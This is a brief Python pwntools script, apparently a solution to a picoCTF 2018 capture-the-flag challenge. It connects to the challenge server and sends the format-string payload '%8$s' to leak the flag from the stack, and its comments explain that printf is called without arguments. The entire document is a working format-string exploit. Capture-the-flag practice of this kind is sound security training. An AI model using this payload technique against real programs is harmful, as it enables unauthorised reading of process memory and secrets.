#!/usr/bin/python
from pwn import *
# we can read up the stack with several %x characters since
# printf has no parameters passed to it
# using this we realize the flag is the 8th element on the stack
def get_flag():
    r = remote('2018shell.picoctf.com', 34802)
    for i in range(3):
        print(r.recvline())
    r.send(b'%8$s\n')
    print(r.recvline())
get_flag()
